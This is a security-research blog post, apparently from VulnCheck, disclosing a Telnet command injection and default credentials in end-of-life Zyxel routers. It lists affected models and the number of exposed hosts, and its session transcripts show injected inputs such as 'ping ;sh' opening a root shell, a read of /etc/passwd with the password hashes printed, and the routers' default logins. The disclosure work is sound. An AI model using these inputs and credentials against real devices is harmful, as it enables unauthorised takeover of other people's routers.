---
title: "Zyxel Telnet Vulnerabilities - Blog - VulnCheck"
date: 2025-02-04T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Zyxel Telnet Vulnerabilities - Blog - VulnCheck

<br/>

<br/>
\# Introduction\\n\\nVulnCheck independently discovered vulnerabilities affecting Zyxel Customer Premises Equipment (CPE) after running into the hardware in the real world. The combination of the vulnerabilities allows for unauthenticated code execution via Telnet. A week ago, our friends at GreyNoise \[blogged\](https://www.greynoise.io/blog/active-exploitation-of-zero-day-zyxel-cpe-vulnerability-cve-2024-40891) about attackers actively using these vulnerabilities against their honeypot network, and the associated \[tag\](https://viz.greynoise.io/tags/zyxel-cpe-cve-2024-40891-command-injection-attempt?days=10) continues to flag ongoing activity. We believe, but have not received confirmation from the vendor, that \*at least\* the following Zyxel CPE routers are affected:\\n\\n\* VMG1312-B10A \\n\* VMG1312-B10B \\n\* VMG1312-B10E \\n\* VMG3312-B10A \\n\* VMG3313-B10A \\n\* VMG3926-B10B \\n\* VMG4325-B10A \\n\* VMG4380-B10A \\n\* VMG8324-B10A \\n\* VMG8924-B10A \\n\* SBG3300 \\n\* SBG3500\\n\\nWe’ve been informed that these affected routers are end-of-life, though not listed on \[Zyxel’s EOL\](https://webservice.zyxel.com/end-of-life) page. Despite this, both \[FOFA\](https://en.fofa.info/result?qbase64=KCJWTUcxMzEyLUIxMEEiIHx8ICJWTUcxMzEyLUIxMEIiIHx8ICJWTUcxMzEyLUIxMEUiIHx8ICJWTUcxMzEyLUIxMEIiIHx8ICJWTUczMzEyLUIxMEEiIHx8ICJWTUczMzEzLUIxMEEiIHx8ICJWTUczOTI2LUIxMEIiIHx8ICJWTUc0MzI1LUIxMEEiIHx8ICJWTUc0MzgwLUIxMEEiIHx8ICJWTUc4MzI0LUIxMEEiIHx8ICJWTUc4OTI0LUIxMEEiIHx8ICJTQkczMzAwIiB8fCAiU0JHMzUwMCIpICYmIHByb3RvY29sPSJ0ZWxuZXQi) and \[Censys\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=EXCLUDE&q=services.telnet.banner%3A%22VMG1312-B10A%22+or+services.telnet.banner%3A%22VMG1312-B10B%22+or+services.telnet.banner%3A%22VMG1312-B10E%22+or+services.telnet.banner%3A%22VMG1312-B10B%22+or+services.telnet.banner%3A%22VMG3312-B10A%22+or+services.telnet.banner%3A%22VMG3313-B10A%22+or+services.telnet.banner%3A%22VMG3926-B10B%22+or+services.telnet.banner%3A%22VMG4325-B10A%22+or+services.telnet.banner%3A%22VMG4380-B10A%22+or+services.telnet.banner%3A%22VMG8324-B10A%22+or+services.telnet.banner%3A%22VMG8924-B10A%22+or+services.telnet.banner%3A%22SBG3300%22+or+services.telnet.banner%3A%22SBG3500%22) identify approximately 1,500 affected systems with internet-facing Telnet interfaces. Additionally, some of these models are still available for purchase through \[Amazon\](https://www.amazon.com/stores/page/F26A3E2F-46D3-46C9-BCDA-3D4EA62563F6/search?terms=VMG4325-B10A).\\n\\n!\[EOL Router in Zyxel Store\](/blog/zyxel-telnet-vulns/amazon-store.png){:width="100%"}\\n\\nWhile these systems are older and seemingly long out of support, they remain highly relevant due to their continued use worldwide and the sustained interest from attackers. The fact that attackers are still actively exploiting these routers underscores the need for attention, as understanding real-world attacks is critical to effective security research.\\n\\nVulnCheck does not have access to all affected models. For the remainder of this blog, all images and exploitation details will be based on our reference device, the VMG4325-B10A, running firmware version \`1.00(AAFR.4)C0\_20170615\`.\\n\\n# CVE-2024-40891: Telnet Authenticated Command Inject\\n\\nThe device’s Telnet command processing is vulnerable to an authenticated command injection when the attacker has access with any user account. This vulnerability has been assigned \[CVE-2024-40891\](https://vulncheck.com/cve/CVE-2024-40891). Command processing is handled by the \`libcms\_cli.so\` library, with most of the work occurring in the \`cli\_processCliCmd\` function. This function is responsible for looking up commands and their associated functions within a large command table.\\n\\n!\[Decompiled CLI logic\](/blog/zyxel-telnet-vulns/processclicmd.png){:width="100%"}\\n\\nHowever, some commands do not have built-in functions. For example, the following screenshot shows that the \`echo\` command is handled by \`FUN\_0001b5a8\` but there is no function associated with \`ifconfig\`.\\n\\n!\[Decompiled Command Table\](/blog/zyxel-telnet-vulns/clitable.png){:width="100%"}\\n\\nInstead, \`ifconfig\` is passed to \`prctl\_runCommandInShellWithTimeout\`. This is where the trouble starts, because \`libcms\_cli.so\` only verifies that the command starts with \`ifconfig \` before invoking \`prctl\_runCommandInShellWithTimeout\`, which is merely a thin wrapper around \`runCommandInShell\` in \`libcms\_util.so\`. \\n\\n!\[Decompiled runCommandInShell\](/blog/zyxel-telnet-vulns/runCommand.png){:width="100%"}\\n\\nThe decompiled function above shows that \`runCommandInShell\` has no filtering. As a result, Telnet commands that are passed to \`prctl\_runCommandInShellWithTimeout\` are vulnerable to command injection. The affected commands include:\\n\\n\* cat \\n\* ifconfig \\n\* ping \\n\* ps \\n\* pwd \\n\* tftp \\n\* wlctl\\n\\nBecause there is no filtering, the command injection can be executed in multiple ways. For example, the following uses \`||\` to execute additional commands after forcing \`tftp\` to fail with the -\`h\` flag:\\n\\n\`\`\`shell\\nalbinolobster@mournland:~$ telnet 192.168.0.1\\nTrying 192.168.0.1...\\nConnected to 192.168.0.1.\\nEscape character is '^\]'.\\nZyxel VMG4325-B10A\\nLogin: zyuser\\nPassword:\\n > tftp -h || sh\\ntftp: invalid option -- h\\nBusyBox v1.17.2 (2017-06-15 12:25:20 CST) multi-call binary.\\n\\nUsage: tftp \[OPTIONS\] HOST \[PORT\]\\n\\nTransfer a file from/to tftp server\\n\\nOptions:\\n -l FILE Local FILE\\n -r FILE Remote FILE\\n -g Get file\\n -p Put file\\n -g -t i -f filename server\_ip Get (flash) broadcom or whole image to modem\\n -g -t c -f filename server\_ip Get (flash) config file to modem\\n -p -t f -f filename server\_ip Put (backup) config file to tftpd server\\n\\n\\n\\nBusyBox v1.17.2 (2017-06-15 12:25:20 CST) built-in shell (ash)\\nEnter 'help' for a list of built-in commands.\\n\\n# ls -l\\ndrwxr-xr-x 3 supervis root 0 Jan 1 1970 app\\ndrwxr-xr-x 2 supervis root 0 Jun 15 2017 bin\\n-rw-r--r-- 1 supervis root 163928 Jun 15 2017 cferam.000\\ndrwxr-xr-x 4 supervis root 0 Jan 1 1970 data\\ndrwxrwxr-x 4 supervis root 0 Jun 15 2017 dev\\ndrwxr-xr-x 10 supervis root 0 Jun 15 2017 etc\\ndrwxr-xr-x 2 supervis root 0 Jan 1 1970 home\\ndrwxrwxr-x 6 supervis root 0 Jun 15 2017 lib\\nlrwxrwxrwx 1 supervis root 11 Jun 15 2017 linuxrc -> bin/busybox\\ndrwxr-xr-x 2 supervis root 0 Jan 1 1970 log\\ndrwxr-xr-x 2 supervis root 0 Jan 3 20:29 mnt\\ndrwxrwxr-x 5 supervis root 0 Jun 15 2017 opt\\ndr-xr-xr-x 90 supervis root 0 Jan 1 1970 proc\\ndrwxrwxr-x 2 supervis root 0 Jun 15 2017 sbin\\ndrwxr-xr-x 11 supervis root 0 Jan 1 1970 sys\\nlrwxrwxrwx 1 supervis root 8 Jun 15 2017 tmp -> /var/tmp\\ndrwxrwxr-x 4 supervis root 0 Jun 15 2017 usr\\ndrwxr-xr-x 14 supervis root 0 Jan 3 22:09 var\\n-rw-rw-r-- 1 supervis root 1446798 Jun 15 2017 vmlinux.lz\\ndrwxrwxr-x 4 supervis root 0 Jun 15 2017 webs\\n#\\n\`\`\`\\n\\nThis technique can be repeated against the other affected commands using various combinations of \[shell metacharacters\](https://www.gnu.org/software/bash/manual/html\_node/Definitions.html#index-metacharacter).\\n\\n# CVE-2025-0890: Default Credentials\\n\\nBy itself, an authenticated command injection has limited value to an attacker—especially over Telnet, which ideally should not be exposed to the internet (though, in reality, \[millions\](https://en.fofa.info/result?qbase64=cHJvdG9jb2w9InRlbG5ldCI%3D) of devices are). The impact of CVE-2024-40891 depends heavily on an authentication bypass or default credentials. Unfortunately, these affected devices appear to be provisioned with default accounts, all of which can be found in the device’s \`/etc/default.cfg\` file. Here is a snippet from our VMG4325-B10A:\\n\\n\`\`\`xml\\n\\n supervisor\\n enlhZDEyMzQ=\\n2\\n\\n broadband,wireless,homeNetworking,routing,qos,nat,dns,igmpSetting,halfBridge,intfGrp,usbService,firewall,macFilter,parentalControl,schedulerRule,certificates,ipsecVPN,log,trafficStatus,arpTable,routeTable,igmpGroupStatus,xdslStatistics,system,userAccount,remoteMGMT,tr069Client,tr064,time,emailNotification,logSetting,firmwareUpgrade,configuration,reboot,disagnostic,HelpDesk,wizard,sniffer,snmp\\n Administrator\\n 2\\n \\n admin\\n MTIzNAA=\\n 0\\n 1\\n \\n \\n\\n\\n 2\\n broadband,wireless,homeNetworking,routing,qos,nat,dns,igmpSetting,halfBridge,intfGrp,usbService,firewall,macFilter,parentalControl,schedulerRule,certificates,ipsecVPN,log,trafficStatus,arpTable,routeTable,igmpGroupStatus,xdslStatistics,system,userAccount,remoteMGMT,tr069Client,tr064,time,emailNotification,logSetting,firmwareUpgrade,configuration,reboot,disagnostic,HelpDesk,wizard,sniffer,snmp\\n User\\n 2\\n \\n zyuser\\n MTIzNAA=\\n 0\\n 1\\n \\n \\n\\n\\n\\n\`\`\`\\n\\nAs shown above, the VMG4325-B10A is provisioned with three accounts:\\n\\n1. supervisor:zyad1234 \\n2. admin:1234 \\n3. zyuser:1234\\n\\nThe \`supervisor\` credentials were previously documented under \[CVE-2017-18371\](https://nvd.nist.gov/vuln/detail/cve-2017-18371), but that CVE currently only associates the account with \[Zyxel P660HN-51\](https://www.amazon.com/Zyxel-ADSL-Wireless-Gateway-P660HN-51/dp/B0051SHXPQ) routers. However, we now see this vulnerability extending to the VMG series as well. The functionality of the \`supervisor\` user is poorly documented by CVE-2017-18371, so before proceeding, we’ll take a quick detour to explore it further.\\n\\nThese credentials are not visible via the web interface; notably, the \`supervisor\` account has additional functionality in the Telnet interface. As previously discussed, \`libcms\_cli.so\` handles Telnet commands. If the standard \`cli\_processCliCmd\` does not recognize a command, it falls back to the aptly named \`cli\_processHiddenCmd\`:\\n\\n!\[Decompiled Process Hidden Command Call\](/blog/zyxel-telnet-vulns/hiddenCmd.png){:width="100%"}\\n\\n\`cli\_processHiddenCmd\` handles a list of commands that are not listed in the \`help\` menu and are only available to the supervisor user. While the list of hidden commands is short, it includes several powerful options:\\n\\n1. dumpmem \\n2. ebtables \\n3. iptables \\n4. logread \\n5. setmem \\n6. sh\\n\\nNotably, the \`sh\` command provides a fully interactive \`ash\` shell, granting the user unrestricted access to the system.\\n\\n\`\`\`shell\\nalbinolobster@mournland:~/research/misc-exploits$ telnet 192.168.0.1\\nTrying 192.168.0.1...\\nConnected to 192.168.0.1.\\nEscape character is '^\]'.\\nZyxel VMG4325-B10A\\nLogin: supervisor\\nPassword:\\n > sh\\n\\n\\nBusyBox v1.17.2 (2017-06-15 12:25:20 CST) built-in shell (ash)\\nEnter 'help' for a list of built-in commands.\\n\\n#\\n\`\`\`\\n\\nWhile \`supervisor\` has hidden privileges and access to undocumented functionality, the provisioned \`zyuser\` is different. It is not a concealed account with secret commands but instead appears to be a secondary user with elevated privileges, despite being fully visible in the user table.\\n\\n!\[Decompiled runCommandInShell\](/blog/zyxel-telnet-vulns/usertable.png){:width="100%"}\\n\\n\\nThe web interface even prompts for a password change upon logging in as \`zyuser\`, but given the lack of a clear purpose for this redundant account, it's unlikely that many users bother to reset the password. Attackers, however, have certainly taken notice. Our colleagues at GreyNoise have observed activity targeting this account, and notably, its credentials were also used by \[BrickerBot\](https://github.com/JeremyNGalloway/mod\_plaintext.py/blob/master/mod\_plaintext.py).\\n\\nUndocumented, or poorly documented, default accounts with easily guessable passwords that are unlikely to be changed pose a significant security risk. We were unable to find an official manual for the VMG4325-B10A beyond a 2012 version and 2015 release notes, neither of which mention the zyuser account, leaving little to no documentation on its existence.\\n\\nWhile it may not be a popular stance, \[CWE-1392\](https://cwe.mitre.org/data/definitions/1392.html) (Use of Default Credentials) exists for a reason. Given that the \`zyuser:1234\` credentials ultimately enable full remote code execution via CVE-2024-40891, we believe it is reasonable to assign this issue its own identifier: CVE-2025-0890.\\n\\nTo reiterate, the \`zyuser\` account cannot use the hidden \`sh\` command via Telnet. Instead, it can only achieve code execution through the command injection (CVE-2024-40891).\\n\\n\`\`\`shell\\nalbinolobster@mournland:~$ telnet 192.168.0.1\\nTrying 192.168.0.1...\\nConnected to 192.168.0.1.\\nEscape character is '^\]'.\\nZyxel VMG4325-B10A\\nLogin: zyuser\\nPassword:\\n > sh\\ntelnetd:error:694.808:processInput:472:unrecognized command sh\\n > ping ;sh\\nBusyBox v1.17.2 (2017-06-15 12:25:20 CST) multi-call binary.\\n\\nUsage: ping \[OPTIONS\] HOST\\n\\nSend ICMP ECHO\_REQUEST packets to network hosts\\n\\nOptions:\\n -4, -6 Force IP or IPv6 name resolution\\n -c CNT Send only CNT pings\\n -s SIZE Send SIZE data bytes in packets (default:56)\\n -I IFACE/IP Use interface or IP address as source\\n -W SEC Seconds to wait for the first response (default:10)\\n (after all -c CNT packets are sent)\\n -w SEC Seconds until ping exits (default:infinite)\\n (can exit earlier with -c CNT)\\n -q Quiet, only displays output at start\\n and when finished\\n\\n\\n\\nBusyBox v1.17.2 (2017-06-15 12:25:20 CST) built-in shell (ash)\\nEnter 'help' for a list of built-in commands.\\n\\n# cat /etc/passwd\\nsupervisor:gNvaS9TkEwk..:0:0:Administrator:/:/bin/sh\\nnobody:Mm/NWrZmKMrT2:99:99:nobody for ftp:/:/bin/false\\nadmin:d7uXUhqhH7hew:100:0:Administrator:/:/bin/sh\\nzyuser:hH7gnvw0ISLfg:101:2:User:/:/bin/sh\\n\`\`\`\\n\\n# Overlap with Existing Research\\n\\nWhile finalizing this blog, VulnCheck conducted a final search for other work that might overlap with our research. We’ve identified three notable overlaps that align with or reinforce our finds:\\n\\n\* A chunk of the code for the Telnet service has been available on GitHub for 12 years and it even includes the \[hidden command logic\](https://github.com/ad7843/hi/blob/8cc9b776ffef2c725c666dc0208031e03e6b85ed/cli.c#L396). It’s notable that talented researcher Jang Nguyen (aka \[testanull\](https://github.com/testanull), aka \[@testanull\](https://x.com/testanull)) has a \[fork\](https://github.com/testanull/hi) of this repository. \\n\* In May 2023, NCCGroup published a blog titled, “\[NETGEAR Routers: A Playground for Hackers?\](https://www.nccgroup.com/us/research-blog/netgear-routers-a-playground-for-hackers/)” in which they describe the \[authenticated command injection\](https://www.nccgroup.com/us/research-blog/netgear-routers-a-playground-for-hackers/#psv-2023-0008---telnet-default-account-privilege-escalation-breakout) affecting the NETGEAR Nighthawk WiFi 6 Router (RAX30 AX2400). No CVE was assigned. \\n\* In July 2024, \[Jirka Balhar\](https://github.com/kukas) published a blog titled, “\[\*Getting admin shell on a Zyxel gateway\*\](https://blog.jirkabalhar.cz/2024/07/gaining-a-full-admin-shell-on-a-zyxel-gateway/)” in which they describe using the \`admin\` account to invoke the hidden \`sh\` command on the Zyxel SBG3300. No CVE was assigned.\\n\\n\\n# Conclusion\\n\\nThe device’s default accounts and command injection vulnerabilities present a serious security risk, especially given their continued exploitation in the wild, as confirmed by GreyNoise. While these devices are aging and supposed to be out of support, thousands remain exposed online. The combination of default credentials and command injection makes them easy targets, highlighting the dangers of insecure default configurations and poor vulnerability transparency. Unsupported does not mean unexploited, and this research underscores the lasting impact of insecure legacy devices.\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always on the lookout for new exploitation in the wild. For more research like this, see our blogs, \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce), \[ProjectSend CVE-2024-11680 Exploited in the Wild\](https://vulncheck.com/blog/projectsend-exploited-itw), \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845), and \[Does Confluence Dream of Shells?\](https://vulncheck.com/blog/confluence-dreams-of-shells)\\n\\nSign up to our website today to get free access to our \[VulnCheck KEV\](https://vulncheck.com/kev) and request a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) products.\\n

#### [Source](https://vulncheck.com/blog/zyxel-telnet-vulns)

<br/>
---
